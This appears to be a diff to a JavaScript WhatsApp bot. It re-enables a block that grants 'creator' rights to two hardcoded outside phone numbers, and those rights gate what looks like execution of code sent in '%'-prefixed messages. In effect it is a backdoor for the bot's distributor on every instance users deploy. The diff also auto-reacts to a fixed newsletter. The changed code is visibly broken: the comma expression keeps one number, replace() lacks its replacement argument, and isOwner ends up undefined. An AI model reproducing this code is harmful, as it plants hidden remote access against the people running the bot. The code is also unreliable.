@@ -207,11 +207,11 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   
-	/*const udp = botNumber.split('@')[0];
+	const udp = botNumber.split('@')[0];
     const jawad = ('94763934860', '94771825193');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);*/
+					.includes(mek.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
@@ -259,8 +259,8 @@ const port = process.env.PORT || 9090;
   m.react("👾")
    }*/
 if (senderNumber === "94763934860" && !isReact) {
-            await conn.sendMessage(from, { react: { text: "👾", key: mek.key } });
-        }	  
+    await conn.sendMessage(from, { react: { text: "👾", key: mek.key } });
+    }	  
 	  
   if (!isReact && senderNumber !== botNumber) {
       if (config.AUTO_REACT === 'true') {
@@ -299,7 +299,7 @@ if (!isReact && senderNumber === botNumber) {
  const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
  await conn.newsletterReactMessage(`120363400240662312@newsletter`, id, randomEmoji);
 
- /*const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
+ const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
  const isBanned = bannedUsers.includes(sender);
  if (isBanned) return; 
 	  
@@ -307,23 +307,7 @@ if (!isReact && senderNumber === botNumber) {
   const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
   
   const isFileOwner = ownerFile.includes(sender);
-  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;*/
-   
-    let sudoUsers = [];
-    let bannedUsers = [];
-    try {
-        if (fs.existsSync('./lib/sudo.json')) sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
-        if (fs.existsSync('./lib/ban.json')) bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-    } catch (e) {
-        console.log("Auth Read Error: " + e);
-    }
-
-	const isSudo = sudoUsers.includes(sender) || sudoUsers.includes(senderNumber);
-    const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860', '94771825193'].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe;
-    const isOwner = isCreator || isSudo;
-    const isBanned = bannedUsers.includes(sender) || bannedUsers.includes(senderNumber);
-
-    if (isBanned && !isOwner) return;
+  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
 	  
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
